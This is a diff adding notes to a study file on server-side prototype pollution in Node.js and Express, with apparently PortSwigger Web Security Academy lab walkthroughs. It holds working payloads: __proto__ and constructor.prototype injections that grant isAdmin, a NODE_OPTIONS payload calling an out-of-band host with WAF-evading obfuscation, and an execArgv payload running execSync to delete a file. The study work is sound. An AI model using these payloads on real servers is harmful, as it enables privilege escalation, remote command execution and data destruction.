@@ -395,6 +395,120 @@ Object.defineProperty(vulnerableObject, 'gadgetProperty', {
 
 Just like the fetch() method we looked at earlier, `Object.defineProperty()` accepts an options object, known as a "descriptor".
 
+
+## Server-side prototype pollution
+
+Due to the emergence of server-side runtimes, such as the hugely popular Node.js, JavaScript is now widely used to build servers, APIs, and other back-end applications. Logically, this means that it's also possible for prototype pollution vulnerabilities to arise in server-side contexts.
+
+
+## Why is server-side prototype pollution more difficult to detect?
+
+* No source code access 
+* Lack of developers tool
+* Could lead to DOS attack 
+* Pollution persistence - We cannot reset the data once the server is polluted unlike client side.
+
+
+## Detecting server-side prototype pollution via polluted property reflection
+
+Developers often forgets about the fact that javaScript ```for..in``` iterates through overall of an objects enumerable properties. 
+
+*Test*
+
+```
+const myObject = { a: 1, b: 2 };
+
+// pollute the prototype with an arbitrary property
+Object.prototype.foo = 'bar';
+
+// confirm myObject doesn't have its own foo property
+myObject.hasOwnProperty('foo'); // false
+
+// list names of properties of myObject
+for(const propertyKey in myObject){
+    console.log(propertyKey);
+}
+
+```
+
+
+## Status code override
+
+Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.
+
+## JSON spaces override
+The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain. 
+
+## Charset override
+Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the body-parser module is commonly used to parse the body of incoming requests in order to generate a req.body object. This contains another gadget that you can use to probe for server-side prototype pollution
+
+## Scanning for server-side prototype pollution sources 
+1. Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and make sure that it is enabled 
+2. Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history. 
+3. In Burp, go to the Proxy > HTTP history tab
+4. Filter the list to show only in-scope items. 
+5. Select all items in the list.
+6. Right-click your selection and go to Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution, then select one of the scanning techniques from the list.  
+7. When prompted, modify the attack configuration if required, then click OK to launch the scan
+
+
+## Bypassing input filters for server-side prototype pollution 
+
+* Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see Bypassing flawed key sanitization. 
+* Access the prototype via the constructor property instead of ```__proto__```.
+
+
+
+## Remote code execution via server-side prototype pollution
+While client-side prototype pollution typically exposes the vulnerable website to DOM XSS, server-side prototype pollution can potentially result in remote code execution (RCE).
+
+## Identifying a vulnerable request
+Some of Node's functions for creating new child processes accept an optional shell property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious NODE_OPTIONS property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created: 
+
+```
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+
+*The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.* 
+
+
+## Remote code execution via child_process.fork() 
+Methods such as child_process.spawn() and child_process.fork() enable developers to create new Node subprocesses. The fork() method accepts an options object in which one of the potential options is the execArgv property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution
+
+```
+"execArgv": [
+    "--eval=require('<module>')"
+]
+```
+In addition to fork(), the child_process module contains the execSync() method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server. 
+
+
+## Remote code execution via child_process.execSync()
+the previous example, we injected the `child_process.execSync()` sink ourselves via the `--eval` command line argument. In some cases, the application may invoke this method of its own accord in order to execute system commands.
+
+Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an execArgv property, you can still inject system commands into a running child process by simultaneously polluting both the shell and input properties
+
+* The `input` option is just a string that is passed to the child process's stdin stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the input property itself may be left undefined.
+
+*  The shell option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined. 
+
+
+## Preventing prototype pollution vulnerabilities
+1. Sanitizing property keys
+2. Preventing changes to prototype objects - 
+    ```
+    Object.freeze(Object.prototype);
+    ```
+3. Preventing an object from inheriting properties
+    ```
+        let myObject = Object.create(null);
+        Object.getPrototypeOf(myObject);    // null
+    ```
+
+
 # LAB
 
 ## Lab: DOM XSS via client-side prototype pollution
@@ -621,3 +735,196 @@ https://0ae8006d03331ec3803435c300f40080.web-security-academy.net/?__proto__[foo
     https://0ac60080032b4d5480db0ddd00a8007f.web-security-academy.net/?__proto__[value]=data:,alert(1)//
     ```
 Which executes the payload.
+
+
+# Lab: Privilege escalation via server-side prototype pollution
+
+Steps taken to solve the lab
+
+1. Logged in to the account via 'http://0a05003204475a6e8015588a00dc00a1.web-security-academy.net/login'
+2. Update the address records which sent the following code.
+    ```json
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5"
+    }
+    ```
+3. We got the following response 
+    ```json
+    {
+        "username": "wiener",
+        "firstname": "Peter",
+        "lastname": "Wiener",
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "isAdmin": false
+    }
+    ```
+4. Now we inject the following payload 
+
+    ```json
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
+        "__proto__": {
+            "foo": "bar"
+        }
+    }
+    ```
+
+5. Now you can notice that the `__proto__` is not being shown and only `foo:bar` is being reflected.
+
+6. Now we can inject the following json data 
+    ```
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
+        "__proto__": {
+            "isAdmin": "true"
+        }
+    }
+    ```
+
+    Which provided us admin access and now we should be able to delete carlos.
+
+
+## Lab: Detecting server-side prototype pollution without polluted property reflection
+1. Login into the account 
+2. Change address 
+3. Now add the following code 
+    ```json
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
+        "__proto__": {
+            "foo": "bar"
+        }
+    }
+    ```
+4. The response does not contains the prototype of foo.
+5. Now break application intentionally by removing one of the comma.
+    ```json
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5"
+        "__proto__": {
+            "foo": "bar"
+        }
+    }
+    ```
+6. Now update the status code.
+    ```json
+    {
+        "address_line_1": "cool1",
+        "address_line_2": "cool2",
+        "city": "cool3",
+        "postcode": "cool4",
+        "country": "cool5",
+        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
+        "__proto__": {
+            "status": 555
+        }
+    }
+    ```
+## Lab: Bypassing flawed input filters for server-side prototype pollution 
+1. Login to account
+2. Change / Modify the address 
+3. Update the json object with the following 
+    ```json
+    {
+    "address_line_1": "Wiener HQs",
+    "address_line_2": "One Wiener Way",
+    "city": "Wienerville",
+    "postcode": "BU1 1RP",
+    "country": "UK",
+    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
+    "__proto__": {
+        "json space": 10
+        }
+    }
+    ```
+    It didn't worked
+4. Now update the json object with the following
+
+    ```json 
+    {
+    "address_line_1": "Wiener HQs",
+    "address_line_2": "One Wiener Way",
+    "city": "Wienerville",
+    "postcode": "BU1 1RP",
+    "country": "UK",
+    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
+    "constructor": {
+        "prototype": {
+        "json spaces": 10
+        }
+    }
+    }
+    ```
+    In burp response tab change prettify to raw
+5. YOu can notice the difference 
+6. Now Send the following request 
+
+    ```json 
+    {
+    "address_line_1": "Wiener HQs",
+    "address_line_2": "One Wiener Way",
+    "city": "Wienerville",
+    "postcode": "BU1 1RP",
+    "country": "UK",
+    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
+    "constructor": {
+        "prototype": {
+        "isAdmin": true
+        }
+    }
+    }
+    ```
+7. Now we got the access of admin panel and we can delete carlos user and solve the lab
+
+## Lab: Remote code execution via server-side prototype pollution 
+1. Login to account 
+2. Update address
+3. Check if you are able to inject the `__proto__` payload
+4. It's reflecting 
+5. Now add the followng exploit
+    ```json
+    {
+        "address_line_1": "Wiener HQs",
+        "address_line_2": "One Wiener Way",
+        "city": "Wienerville",
+        "postcode": "BU1 1RP",
+        "country": "UK",
+        "sessionId": "bDkgPHB9d2HbImMaUkrTNzXLCcFxFMgh",
+        "__proto__": {
+            "execArgv": [
+            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+            ]
+        }
+    }
+    ```
+6. It worked
+
